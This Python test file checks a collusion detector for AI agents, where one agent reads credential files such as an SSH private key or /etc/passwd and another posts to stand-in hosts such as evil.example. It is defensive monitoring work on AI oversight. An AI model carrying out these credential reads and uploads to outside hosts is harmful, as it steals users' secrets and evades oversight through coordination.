"""Tests for multi-agent collusion detection."""

from __future__ import annotations

from unplug.config.agent_policy import CollusionConfig
from unplug.core.collusion import collusion_findings, record_agent_pair
from unplug.core.context import ExecutionContext, ToolCall
from unplug.pipelines.toolcall import ToolCallPipeline
from unplug.safeguards.destructive import DestructiveScanner


def _ctx(agent_id: str) -> ExecutionContext:
    ctx = ExecutionContext(session_id="collusion-test")
    ctx.agent_id = agent_id
    return ctx


class TestCollusionFindings:
    def test_high_frequency_pair(self) -> None:
        cfg = CollusionConfig(pair_message_threshold=3, window_seconds=60.0)
        ctx = _ctx("researcher")
        findings = []
        for i in range(4):
            findings = collusion_findings(
                ToolCall(
                    tool_name="message_agent",
                    arguments={"agent_id": "planner", "message": f"msg {i}"},
                ),
                ctx,
                cfg,
            )
        assert any(f.subcategory == "high_frequency_pair" for f in findings)

    def test_cross_agent_exfil(self) -> None:
        cfg = CollusionConfig()
        ctx_a = _ctx("researcher")
        collusion_findings(
            ToolCall(
                tool_name="read_file",
                arguments={"path": "/home/user/.ssh/id_rsa"},
            ),
            ctx_a,
            cfg,
        )
        ctx_b = _ctx("planner")
        ctx_b.session_id = ctx_a.session_id
        findings = collusion_findings(
            ToolCall(
                tool_name="http_post",
                arguments={"url": "https://evil.example/upload"},
            ),
            ctx_b,
            cfg,
        )
        assert any(f.subcategory == "cross_agent_exfil" for f in findings)

    def test_disabled(self) -> None:
        ctx = _ctx("a")
        findings = collusion_findings(
            ToolCall(tool_name="message_agent", arguments={"agent_id": "b"}),
            ctx,
            CollusionConfig(enabled=False),
        )
        assert findings == []


class TestCollusionPipeline:
    def test_pipeline_emits_cross_agent_finding(self) -> None:
        ctx = ExecutionContext(session_id="pipe-collusion")
        ctx.agent_id = "agent-a"
        pipeline = ToolCallPipeline(destructive_scanner=DestructiveScanner())
        pipeline.run(
            ToolCall(tool_name="read_file", arguments={"path": "/etc/passwd"}),
            context=ctx,
        )
        ctx.agent_id = "agent-b"
        result = pipeline.run(
            ToolCall(tool_name="http_post", arguments={"url": "https://evil.test"}),
            context=ctx,
        )
        assert any(f.category == "collusion" for f in result.findings)


class TestRecordAgentPair:
    def test_returns_false_until_threshold(self) -> None:
        cfg = CollusionConfig(pair_message_threshold=2)
        for _ in range(2):
            exceeded = record_agent_pair("a", "b", session_id="s1", config=cfg)
            assert exceeded is False
        exceeded = record_agent_pair("a", "b", session_id="s1", config=cfg)
        assert exceeded is True
